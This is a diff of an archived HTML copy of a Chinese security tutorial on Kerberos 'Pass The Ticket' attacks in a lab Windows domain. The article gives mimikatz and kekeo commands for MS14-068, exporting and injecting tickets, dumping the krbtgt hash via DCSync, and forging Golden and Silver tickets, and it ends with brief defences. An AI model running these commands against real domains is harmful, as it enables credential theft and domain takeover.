@@ -3,18 +3,18 @@
 			<head>
 			     <title>域渗透——Pass The Ticket - 三好学生</title>
 				 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
-			</head>
+			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style><link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
 			<body>
 				<h1>原文地址:<a href="http://drops.wooyun.org/tips/12159">http://drops.wooyun.org/tips/12159</a></h1>
 				
       <p>
-        <h1>0x00 前言</h1>
+        </p><h1>0x00 前言</h1>
 
-<hr />
+<hr>
 
 <p>上篇介绍了有关Pass The Hash 和Pass The Key的技巧，这次接着介绍一下Pass The Ticket</p>
 
-<p><img src="http://static.wooyun.org//drops/20160118/2016011804523676070160.png" alt="Alt text" /></p>
+<p><img src="../images_result/images/2016011804523676070160.png" alt="Alt text"></p>
 
 <p>此图片引用自http://dfir-blog.com/2015/12/13/protecting-windows-networks-kerberos-attacks/</p>
 
@@ -22,7 +22,7 @@
 
 <h1>0x01 简介</h1>
 
-<hr />
+<hr>
 
 <p>在域环境中，Kerberos协议被用来作身份认证，上图所示即为一次简单的身份认证流程，具体细节可以参考相关资料，这里仅介绍几个名词：</p>
 
@@ -50,7 +50,7 @@ ip：192.168.40.225
 
 <h1>0x02 MS14-068</h1>
 
-<hr />
+<hr>
 
 <p>时至今日，该漏洞已经过去一年多，针对其攻击的防御检测方法已经很成熟，所以对其利用方法做一个回顾。</p>
 
@@ -111,16 +111,16 @@ ip：192.168.40.225
 
 <p>实际测试如图，成功获得了域控的访问权限</p>
 
-<p><img src="http://static.wooyun.org//drops/20160118/2016011804523945815229.png" alt="Alt text" /></p>
+<p><img src="../images_result/images/2016011804523945815229.png" alt="Alt text"></p>
 
-<p><img src="http://static.wooyun.org//drops/20160118/2016011804524160465322.png" alt="Alt text" /></p>
+<p><img src="../images_result/images/2016011804524160465322.png" alt="Alt text"></p>
 
-<p>下载地址：<br />
+<p>下载地址：<br>
 <a href="https://github.com/gentilkiwi/kekeo/releases">https://github.com/gentilkiwi/kekeo/releases</a></p>
 
 <h1>0x03 Export the ticket</h1>
 
-<hr />
+<hr>
 
 <p>在我们成功获得域控权限后，就可以导出域控内存中的Ticket，在默认的10个小时以内都可以利用来登录域控</p>
 
@@ -130,21 +130,21 @@ ip：192.168.40.225
 sekurlsa::tickets /export
 </code></pre>
 
-<p>如图 <img src="http://static.wooyun.org//drops/20160118/2016011804524331131424.png" alt="Alt text" /></p>
+<p>如图 <img src="../images_result/images/2016011804524331131424.png" alt="Alt text"></p>
 
-<p>保存成文件，一共导出如下文件，如图 <img src="http://static.wooyun.org//drops/20160118/2016011804524482635520.png" alt="Alt text" /></p>
+<p>保存成文件，一共导出如下文件，如图 <img src="../images_result/images/2016011804524482635520.png" alt="Alt text"></p>
 
-<p>挑选其中的<code>[0;2d87a]<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="1e332c332e332a2e7b2e2e2e2e2e337f5e756c7c6a796a334a5b4d4a3052515d5f523075776c7c77">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script></code>在域普通用户的主机进行导入</p>
+<p>挑选其中的<code>[0;2d87a]<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="1e332c332e332a2e7b2e2e2e2e2e337f5e756c7c6a796a334a5b4d4a3052515d5f523075776c7c77">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script></code>在域普通用户的主机进行导入</p>
 
 <p>执行：</p>
 
 <pre><code>#!bash
-mimikatz "kerberos::ptt C:\test\[0;2d87a]<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="1d302f302d30292d782d2d2d2d2d307c5d766f7f697a693049584e493351525e5c513376746f7f74">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>"
+mimikatz "kerberos::ptt C:\test\[0;2d87a]<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="1d302f302d30292d782d2d2d2d2d307c5d766f7f697a693049584e493351525e5c513376746f7f74">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>"
 </code></pre>
 
-<p>如图，导入成功 <img src="http://static.wooyun.org//drops/20160118/2016011804524647244617.png" alt="Alt text" /></p>
+<p>如图，导入成功 <img src="../images_result/images/2016011804524647244617.png" alt="Alt text"></p>
 
-<p>查看是否有域控权限，如图 <img src="http://static.wooyun.org//drops/20160118/2016011804524841803715.png" alt="Alt text" /></p>
+<p>查看是否有域控权限，如图 <img src="../images_result/images/2016011804524841803715.png" alt="Alt text"></p>
 
 <blockquote>
   <p><strong>Tips：</strong></p>
@@ -157,7 +157,7 @@ mimikatz "kerberos::ptt C:\test\[0;2d87a]<a class="__cf_email__" href="/cdn-cgi/
 
 <h1>0x04 Golden Ticket</h1>
 
-<hr />
+<hr>
 
 <p>每个用户的Ticket都是由krbtgt的密码Hash来生成的，那么，我们如果拿到了krbtgt的密码Hash，不就可以随意伪造Ticket了吗？</p>
 
@@ -173,7 +173,7 @@ mimikatz log "lsadump::dcsync /domain:test.local /user:krbtgt"
 
 <p>生成mimikatz.log记录输出，使用log输出是为了方便复制Hash值</p>
 
-<p>如图: <img src="http://static.wooyun.org//drops/20160118/2016011804525037386815.png" alt="Alt text" /></p>
+<p>如图: <img src="../images_result/images/2016011804525037386815.png" alt="Alt text"></p>
 
 <p>找到如下信息：</p>
 
@@ -198,11 +198,11 @@ mimikatz "kerberos::golden /domain:test.local /sid:S-1-5-21-4155807533-921486164
 <blockquote>
   <p><strong>Tips:</strong></p>
   
-  <p>生成Golden Ticket不仅可以使用aes256，也可用krbtgt的NTLM hash<br />
+  <p>生成Golden Ticket不仅可以使用aes256，也可用krbtgt的NTLM hash<br>
   可以用<code>mimikatz "lsadump::lsa /patch"</code>导出</p>
 </blockquote>
 
-<p>如图 <img src="http://static.wooyun.org//drops/20160118/2016011804525192783914.png" alt="Alt text" /></p>
+<p>如图 <img src="../images_result/images/2016011804525192783914.png" alt="Alt text"></p>
 
 <p>导入Golden Ticket，执行如下命令：</p>
 
@@ -210,7 +210,7 @@ mimikatz "kerberos::golden /domain:test.local /sid:S-1-5-21-4155807533-921486164
 kerberos::ptt c:\test\gold.kirbi
 </code></pre>
 
-<p>如图，成功获得域控权限 <img src="http://static.wooyun.org//drops/20160118/20160118045253367301016.png" alt="Alt text" /></p>
+<p>如图，成功获得域控权限 <img src="../images_result/images/20160118045253367301016.png" alt="Alt text"></p>
 
 <blockquote>
   <p><strong>Tips：</strong></p>
@@ -224,7 +224,7 @@ kerberos::ptt c:\test\gold.kirbi
 
 <h1>0x05 Silver Ticket</h1>
 
-<hr />
+<hr>
 
 <p>Silver Ticket是伪造的TGS(Ticket Granting Server)ticket，所以也叫service ticket</p>
 
@@ -250,11 +250,11 @@ kerberos::ptt c:\test\gold.kirbi
 
 <p><strong>举例说明Silver Ticket：</strong></p>
 
-<p>正常的认证流程为 <img src="http://static.wooyun.org//drops/20160118/20160118045254154911118.png" alt="Alt text" /></p>
+<p>正常的认证流程为 <img src="../images_result/images/20160118045254154911118.png" alt="Alt text"></p>
 
 <p>此图片引用自http://dfir-blog.com/2015/12/13/protecting-windows-networks-kerberos-attacks/</p>
 
-<p>如果使用了Silver Ticket，认证流程变为 <img src="http://static.wooyun.org//drops/20160118/20160118045256924591213.png" alt="Alt text" /></p>
+<p>如果使用了Silver Ticket，认证流程变为 <img src="../images_result/images/20160118045256924591213.png" alt="Alt text"></p>
 
 <p>此图片引用自http://dfir-blog.com/2015/12/13/protecting-windows-networks-kerberos-attacks/</p>
 
@@ -281,7 +281,7 @@ kerberos::ptt c:\test\gold.kirbi
 mimikatz log "sekurlsa::logonpasswords"
 </code></pre>
 
-<p>如图 <img src="http://static.wooyun.org//drops/20160118/20160118045258859671313.png" alt="Alt text" /></p>
+<p>如图 <img src="../images_result/images/20160118045258859671313.png" alt="Alt text"></p>
 
 <blockquote>
   <p><strong>注：</strong></p>
@@ -308,9 +308,9 @@ mimikatz "kerberos::golden /domain:test.local /sid:S-1-5-21-4155807533-921486164
 
 <p>如图，成功导入，此时可以成功访问域控上的文件共享</p>
 
-<p><img src="http://static.wooyun.org//drops/20160118/20160118045259636391411.png" alt="Alt text" /></p>
+<p><img src="../images_result/images/20160118045259636391411.png" alt="Alt text"></p>
 
-<p><img src="http://static.wooyun.org//drops/20160118/20160118045301480271510.png" alt="Alt text" /></p>
+<p><img src="../images_result/images/20160118045301480271510.png" alt="Alt text"></p>
 
 <p><strong>为了加深理解，再举一个例子</strong></p>
 
@@ -339,7 +339,7 @@ mimikatz "kerberos::golden /domain:test.local /sid:S-1-5-21-4155807533-921486164
   <p>Silver Ticket是伪造的TGS，也就是说其范围有限，只能访问指定的服务权限</p>
 </blockquote>
 
-<p>如图，虽然成功导入，但是无法访问域控的文件共享 <img src="http://static.wooyun.org//drops/20160118/2016011804530234483167.png" alt="Alt text" /></p>
+<p>如图，虽然成功导入，但是无法访问域控的文件共享 <img src="../images_result/images/2016011804530234483167.png" alt="Alt text"></p>
 
 <p>但是执行如下命令可以远程访问LDAP服务来获得krbtgt的信息：</p>
 
@@ -347,7 +347,7 @@ mimikatz "kerberos::golden /domain:test.local /sid:S-1-5-21-4155807533-921486164
 mimikatz "lsadump::dcsync /dc:WIN-8VVLRPIAJB0.test.local /domain:test.local /user:krbtgt"
 </code></pre>
 
-<p>如图，成功远程获得krbtgt账户信息 <img src="http://static.wooyun.org//drops/20160118/2016011804530435070176.png" alt="Alt text" /></p>
+<p>如图，成功远程获得krbtgt账户信息 <img src="../images_result/images/2016011804530435070176.png" alt="Alt text"></p>
 
 <p>注：</p>
 
@@ -366,13 +366,13 @@ mimikatz "lsadump::dcsync /dc:WIN-8VVLRPIAJB0.test.local /domain:test.local /use
 
 <p>当然，还有其他服务可通过伪造Silver Ticket访问：</p>
 
-<p>如图列举了其他可用作Silver Ticket的服务： <img src="http://static.wooyun.org//drops/20160118/2016011804530538083186.png" alt="Alt text" /></p>
+<p>如图列举了其他可用作Silver Ticket的服务： <img src="../images_result/images/2016011804530538083186.png" alt="Alt text"></p>
 
 <p>此图片引用自https://adsecurity.org/?p=2011</p>
 
 <h1>0x06 防御</h1>
 
-<hr />
+<hr>
 
 <ol>
 <li>域控及时更新补丁</li>
@@ -382,7 +382,7 @@ mimikatz "lsadump::dcsync /dc:WIN-8VVLRPIAJB0.test.local /domain:test.local /use
 
 <h1>0x07 小结</h1>
 
-<hr />
+<hr>
 
 <p>本文介绍了和Pass The Ticket有关的技术，着重对实际使用的一些情况做了演示，无论攻防，只有实践，才会进步。</p>
 
@@ -390,7 +390,7 @@ mimikatz "lsadump::dcsync /dc:WIN-8VVLRPIAJB0.test.local /domain:test.local /use
 
 <h1>0x08 参考资料：</h1>
 
-<hr />
+<hr>
 
 <ul>
 <li><a href="http://www.roguelynn.com/words/explain-like-im-5-kerberos/">http://www.roguelynn.com/words/explain-like-im-5-kerberos/</a></li>
@@ -401,7 +401,7 @@ mimikatz "lsadump::dcsync /dc:WIN-8VVLRPIAJB0.test.local /domain:test.local /use
 <li><a href="http://dfir-blog.com/2015/12/13/protecting-windows-networks-kerberos-attacks/">http://dfir-blog.com/2015/12/13/protecting-windows-networks-kerberos-attacks/</a></li>
 </ul>
 
-<p><strong>本文由三好学生原创并首发于乌云drops，转载请注明</strong></p>      </p>
+<p><strong>本文由三好学生原创并首发于乌云drops，转载请注明</strong></p>      <p></p>
     
 			</body>
 		</html>
